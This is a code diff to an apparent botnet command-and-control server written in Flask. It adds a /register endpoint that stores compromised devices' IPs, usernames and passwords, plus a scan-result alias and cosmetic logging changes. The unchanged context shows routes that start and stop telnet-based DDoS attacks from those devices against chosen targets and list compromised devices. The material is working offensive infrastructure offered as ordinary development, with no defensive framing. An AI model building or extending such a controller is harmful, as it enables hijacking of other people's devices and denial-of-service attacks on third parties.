@@ -50,6 +50,46 @@ def bot_checkin():
     """Handle bot check-in requests"""
     return handle_bot_checkin(db_manager, request.json)
     
+@app.route('/register', methods=['POST'])
+def register_device():
+    """Alias for device registration (same as bot-checkin)"""
+    try:
+        data = request.json
+        if not data:
+            logging.error("No data provided in register request")
+            return jsonify({'error': 'No data provided'}), 400
+            
+        ip = data.get('ip')
+        username = data.get('username') 
+        password = data.get('password')
+        device_type = data.get('device_type', 'unknown')
+        
+        if not all([ip, username, password]):
+            logging.error("Missing required fields in register request")
+            return jsonify({'error': 'Missing required fields: ip, username, password'}), 400
+
+        logging.info(f"Registering device: IP={ip}, Username={username}, Type={device_type}")
+          # Convert to bot-checkin format
+        bot_data = {
+            'bot_ip': ip,
+            'username': username,
+            'password': password,
+            'device_type': device_type,
+            'status': 'online'
+        }
+        
+        success = db_manager.add_or_update_device(ip, username, password, device_type)
+        if success:
+            logging.info(f"[SUCCESS] Successfully registered device {ip}")
+            return jsonify({'status': 'success', 'message': f'Device {ip} registered successfully'})
+        else:
+            logging.error(f"[FAIL] Failed to register device {ip}")
+            return jsonify({'error': 'Failed to register device'}), 500
+            
+    except Exception as e:
+        logging.error(f"Error in register: {e}")
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/add-scan-result', methods=['POST'])
 def add_scan_result():
     """Add a new scan result to the database"""
@@ -66,20 +106,52 @@ def add_scan_result():
         if not all([ip, port, service]):
             logging.error("Missing required fields in add-scan-result request")
             return jsonify({'error': 'Missing required fields'}), 400
-
+            
         logging.info(f"Adding scan result: IP={ip}, Port={port}, Service={service}")
         
         success = db_manager.add_scan_result(ip, port, service)
-        
         if success:
-            logging.info(f"✓ Successfully added scan result for {ip}:{port} ({service})")
+            logging.info(f"[SUCCESS] Successfully added scan result for {ip}:{port} ({service})")
             return jsonify({'status': 'success', 'message': 'Scan result added successfully'})
         else:
-            logging.error(f"✗ Failed to add scan result for {ip}:{port}")
+            logging.error(f"[FAIL] Failed to add scan result for {ip}:{port}")
             return jsonify({'error': 'Failed to add scan result'}), 500
             
     except Exception as e:
         logging.error(f"Error in add-scan-result: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/scan-result', methods=['POST'])
+def scan_result():
+    """Alias for adding scan results (same as add-scan-result)"""
+    try:
+        data = request.json
+        if not data:
+            logging.error("No data provided in scan-result request")
+            return jsonify({'error': 'No data provided'}), 400
+            
+        ip = data.get('ip')
+        port = data.get('port')
+        service = data.get('service')
+        state = data.get('state', 'open')  # Default to 'open' if not provided
+        
+        if not all([ip, port, service]):
+            logging.error("Missing required fields in scan-result request")
+            return jsonify({'error': 'Missing required fields: ip, port, service'}), 400
+
+        logging.info(f"Adding scan result: IP={ip}, Port={port}, Service={service}, State={state}")
+        
+        success = db_manager.add_scan_result(ip, port, service, state)
+        
+        if success:
+            logging.info(f"[SUCCESS] Successfully added scan result for {ip}:{port} ({service}) - {state}")
+            return jsonify({'status': 'success', 'message': 'Scan result added successfully'})
+        else:
+            logging.error(f"[FAIL] Failed to add scan result for {ip}:{port}")
+            return jsonify({'error': 'Failed to add scan result'}), 500
+            
+    except Exception as e:
+        logging.error(f"Error in scan-result: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/get-scan-results', methods=['GET'])
@@ -164,7 +236,7 @@ def start_attack():
                     'start_time': datetime.now(),
                     'session': session
                 }
-            logging.info(f"✓ Started {attack_type} attack from {bot_ip} to {target}")
+            logging.info(f"[SUCCESS] Started {attack_type} attack from {bot_ip} to {target}")
             return jsonify({
                 'status': 'success', 
                 'message': f'Attack started successfully from {bot_ip} to {target}',
@@ -275,17 +347,17 @@ def start_telnet_ddos():
                         }
                     success_count += 1
                     successful_ips.append(device_ip)
-                    logging.info(f"✓ Started {attack_type} attack from {device_ip} to {target}")
+                    logging.info(f"[SUCCESS] Started {attack_type} attack from {device_ip} to {target}")
                 else:
                     error_msg = f"Failed to establish telnet connection"
                     failed_ips[device_ip] = error_msg
-                    logging.warning(f"✗ {error_msg} to {device_ip}")
+                    logging.warning(f"[FAIL] {error_msg} to {device_ip}")
 
             except Exception as e:
                 error_msg = str(e)
                 device_ip = device.get('ip', 'unknown')
                 failed_ips[device_ip] = error_msg
-                logging.error(f"✗ Error starting attack on {device_ip}: {e}")
+                logging.error(f"[FAIL] Error starting attack on {device_ip}: {e}")
                 continue
 
         # Log attack to database for historical tracking
@@ -339,11 +411,11 @@ def stop_telnet_ddos():
                         session.close()
                         stopped_count += 1
                         stopped_ips.append(bot_ip)
-                        logging.info(f"✓ Stopped attack from {bot_ip}")
+                        logging.info(f"[SUCCESS] Stopped attack from {bot_ip}")
                 except Exception as e:
                     error_msg = str(e)
                     errors[bot_ip] = error_msg
-                    logging.error(f"✗ Error closing session for {bot_ip}: {e}")
+                    logging.error(f"[FAIL] Error closing session for {bot_ip}: {e}")
 
             # Clear active attacks
             active_attacks.clear()
@@ -398,9 +470,8 @@ def page_not_found(e):
     logging.warning(f"404 error: {request.path}")
     return jsonify({
         'error': 'Endpoint not found',
-        'path': request.path,
-        'available_endpoints': [
-            '/', '/bot-checkin', '/add-scan-result', 
+        'path': request.path,        'available_endpoints': [
+            '/', '/bot-checkin', '/register', '/add-scan-result', '/scan-result',
             '/get-scan-results', '/get-compromised-devices',
             '/start-attack', '/stop-attack',
             '/start-telnet-ddos', '/stop-telnet-ddos',
